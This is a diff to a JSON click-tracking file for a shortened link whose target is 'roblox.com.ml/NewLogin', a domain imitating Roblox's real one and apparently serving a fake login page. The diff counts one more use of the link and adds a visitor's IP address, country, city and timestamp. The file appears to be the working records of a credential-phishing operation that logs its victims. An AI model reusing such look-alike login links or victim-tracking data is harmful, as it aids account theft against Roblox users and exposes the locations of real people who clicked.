@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 699,
+    "useCount": 700,
     "createdBy": "admin",
     "clicks": [
       {
@@ -5704,6 +5704,14 @@
         "city": "Rabat",
         "flag": "🇲🇦",
         "countryCode": "MA"
+      },
+      {
+        "timestamp": 1777133452598,
+        "ip": "177.137.60.79",
+        "country": "Brazil",
+        "city": "Pato Branco",
+        "flag": "🇧🇷",
+        "countryCode": "BR"
       }
     ]
   },
